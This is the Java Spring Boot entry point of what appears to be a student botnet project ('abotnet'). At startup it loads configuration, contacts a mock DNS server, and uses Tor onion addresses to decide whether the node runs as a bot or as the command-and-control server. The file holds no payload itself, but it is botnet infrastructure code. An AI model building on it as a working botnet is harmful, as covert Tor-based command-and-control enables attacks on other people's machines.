package cs.sii.abotnet;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;

import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.config.onLoad.Initialize;
import cs.sii.control.command.Commando;
import cs.sii.service.connection.NetworkService;

@SpringBootApplication
@ComponentScan("cs.sii")
@EnableJpaRepositories("cs.sii")
@EnableAsync
@EnableGlobalMethodSecurity(prePostEnabled = true)
public class Application {

	@Autowired
	private Config configEngine;

	@Autowired
	private NetworkService nServ;

	@Autowired
	private Initialize init;

	@Autowired
	private Behavior bot;

	@Autowired
	private Commando cec;

	public static void main(String[] args) {
		SpringApplication.run(Application.class, args);

	}


	
	@Bean
	public CommandLineRunner commandLineRunner(ApplicationContext ctx) {
		return args -> {   
//			System.setProperty("javax.net.ssl.keyStoreType", "JKS");
//			System.setProperty("javax.net.ssl.trustStrore", "cacerts.jks");
			System.out.println("CARICO CONFIGURAZIONI E INFORMAZIONI DI SISTEMA");
			init.loadInfo();


			//System.out.println(nServ.resolveDnsTOR());


			//TODO riabilitare sta roba dopo i test
			if (nServ.firstConnectToMockServerDns()) {

					if (nServ.getCommandConquerOnions().get(0).getValue1().getOnion().equals(nServ.getMyOnion().getOnion()))
						configEngine.setCommandandconquerStatus(true);

					if (!configEngine.isCommandandconquerStatus()) {
						System.out.println("SONO UN BOT\n");
						bot.initializeBot();

					} else {
						System.out.println("SONO UN CEC\n");
						cec.initializeCeC();

					}

			}


		};
	}

}